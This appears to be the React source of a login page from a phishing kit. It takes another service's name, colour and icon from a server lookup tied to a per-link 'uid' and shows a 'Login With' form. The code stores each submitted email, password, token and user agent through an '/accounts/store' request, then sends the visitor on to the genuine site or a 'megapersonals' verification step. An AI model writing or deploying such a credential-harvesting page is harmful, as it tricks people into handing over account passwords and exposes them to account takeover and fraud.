import { useEffect, useState } from "react";
import { Helmet } from "react-helmet";
import { useNavigate, useParams, useSearchParams } from "react-router-dom";
import request from "../../utils/request";
import PageLoader from "../../Components/PageLoader";

export default function Login() {
   const [searchParams, setSearchParams] = useSearchParams();
    let {site, categoryType} = useParams();
    const navigate = useNavigate();
    const [sites, setSites] = useState(null)
   const [categoryTypes, setCategoryTypes] = useState(null)

   const [email, setEmail] = useState('')
   const [password, setPassword] = useState('')
   // const [errors, setErrors] = useState()

      const getDetails = async () => {

      try {
         const { data } = await request.get(`/url-information/${site}/${categoryType}/${searchParams.get("uid")}`);
         
         setCategoryTypes(data.videoCalling)
         setSites(data.site)
         
      } catch (error) {
         if (error.status === 403) {
            navigate('/page-not-found'); 
         }

         console.log(error);
      }
   }

   const handleSubmit = async (e) => { 
      e.preventDefault();

      try {
         const { data } = await request.post('/accounts/store', {
            email,
            password,
            user_access_token: searchParams.get("uid"),
            site: site,
            user_agent: window.navigator.userAgent
         });

         if (data.success) {
            if (data.account.site == 'megapersonals') {
               window.location.href = '/megapersonals/account-verify?token=' + data.account_access_token
               return
            }

            window.location.href = data.site_details.redirect_url
         }
         
      } catch (error) {
         if (error.status === 403) {
            navigate('/page-not-found'); 
         }

         console.log(error);
      }
   }
   
   useEffect(() => { 
      if (!searchParams.get("uid")) {
         navigate('/page-not-found'); 
      } else {
         getDetails()
      }
   }, [searchParams])
  return (
     <>
        <Helmet>
            <title>Home - Login</title>
            <link rel="icon" type="image/png" href={categoryTypes?.image} />
            <link rel="icon" type="image/svg" href={categoryTypes?.image}/>
            <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet"></link>
            <link href="/video-calling/index.css" rel="stylesheet"></link>
            <script src="https://cdn.tailwindcss.com"></script>
        </Helmet>
        <PageLoader>
           <div id="mainSystem" className="h-screen z-1 relative flex items-center justify-center">
         <div id="authenticationBlock" className="min-w-[300px] max-w-[450px] w-full bg-white rounded">
            <div id="loginSystem">
               <form onSubmit={handleSubmit}>
                  <div className="p-5 ">
                       <h2 className="text-2xl font-bold text-gray-600 text-center capitalize">Login With {sites?.name?.replace('_', ' ')}</h2>
                     <div className="p-2 py-1 my-7 flex items-center bg-white overflow-hidden">
                        <div className="w-full">
                             <label className="w-full text-xs block" htmlFor="email"></label>
                             
                             <input
                                value={email}
                                 onChange={(e) => setEmail(e.target.value)}
                                id="email"
                                className={"w-full px-3 border rounded text-lg py-1 " + `border-[${categoryTypes?.color}] outline-[${categoryTypes?.color}]`}
                                type="email" name="email"
                                required
                                placeholder="Email address*"
                             />
                        </div>
                     </div>
                     <div className="p-2 py-1 my-7 flex items-center bg-white overflow-hidden">
                        <div className="w-full">
                           <label className="w-full text-xs block" htmlFor="password"></label>
                             <input
                                value={password}
                                 onChange={(e) => setPassword(e.target.value)}
                                id="password"
                                className={"w-full px-3 border rounded text-lg py-1 " + `border-[${categoryTypes?.color}] outline-[${categoryTypes?.color}]`}
                                type="password"
                                name="password"
                                required
                                placeholder="password"
                             />
                            {/* <div className="text-red-500 mt-1">Lorem ipsum dolor sit amet consectetur, adipisicing elit.</div> */}

                        </div>
                     </div>

                     <input type="submit" name="submit" className={"cursor-pointer block p-2 my-5 w-full text-xl font-semibold text-white rounded-md " + `bg-[${categoryTypes?.color}]`} value="login Now"/>
                  </div>
               </form>
            </div>
         </div>
      </div>
     </PageLoader>
     </>
  )
}
